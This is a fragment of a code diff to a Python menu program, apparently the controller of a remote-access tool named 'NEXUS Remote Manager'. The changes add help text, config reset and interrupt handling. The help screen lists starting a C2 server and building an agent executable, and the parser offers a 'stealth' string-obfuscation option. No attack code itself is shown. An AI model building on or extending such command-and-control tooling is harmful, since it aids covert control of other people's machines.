             elif ch == "t":
                 self.stop_server()
-                input("\n  Press Enter...")
+                input("\n  Press Enter to continue...")
             elif ch == "b":
                 self.save_config()
                 self.build_agent()
-                input("\n  Press Enter...")
+                input("\n  Press Enter to continue...")
             elif ch == "c":
-                print("\n--- Config ---")
-                for k, v in c.items():
-                    print(f"  {k}: {v}")
-                input("\n  Press Enter...")
+                self.show_full_config()
+                input("\n  Press Enter to continue...")
+            elif ch == "r":
+                confirm = input("  Reset all configuration to defaults? (y/N): ").lower()
+                if confirm == 'y':
+                    self.reset_config()
+                input("\n  Press Enter to continue...")
             elif ch == "q":
                 self.save_config()
-                print("Bye")
+                print("\n  [+] Shutting down...")
+                print("  [+] Goodbye!")
                 break
+            elif ch == "help":
+                print("\n  NEXUS Remote Manager Help")
+                print("  " + "="*30)
+                print("  Configuration:")
+                print("    1-0 - Toggle configuration options")
+                print("    P   - Set UDP stream port")
+                print("\n  Actions:")
+                print("    S   - Start C2 server")
+                print("    T   - Stop C2 server")
+                print("    B   - Build agent executable")
+                print("    C   - Show full configuration")
+                print("    R   - Reset to defaults")
+                print("    Q   - Quit application")
+                input("\n  Press Enter to continue...")
+            else:
+                print(f"  [!] Unknown option: {ch}")
+                time.sleep(1)
 
 
 def main():
@@ -586,16 +838,18 @@ def main():
     parser.add_argument("--icon", help="Icon .ico file")
     parser.add_argument("--stealth", action="store_true", help="Enable string obfuscation")
     parser.add_argument("--no-stealth", action="store_true", help="Disable string obfuscation")
-    parser.add_argument("--stream-port", help="UDP stream port (default: HTTP port + 1000)")
+    parser.add_argument("--stream-port", help="UDP stream port")
     args = parser.parse_args()
 
     m = Manager()
+    
     if args.no_stealth:
         m.config["stealth"] = False
     if args.stealth:
         m.config["stealth"] = True
     if args.stream_port:
         m.config["stream_port"] = args.stream_port
+        
     if args.build:
         if ":" in args.build:
             ip, port = args.build.split(":", 1)
@@ -610,7 +864,12 @@ def main():
             m.config["icon"] = args.icon
         m.build_agent()
     else:
-        m.run()
+        try:
+            m.run()
+        except KeyboardInterrupt:
+            print("\n\n  [!] Interrupted by user")
+            m.save_config()
+            print("  [+] Configuration saved. Goodbye!")
 
 
 if __name__ == "__main__":
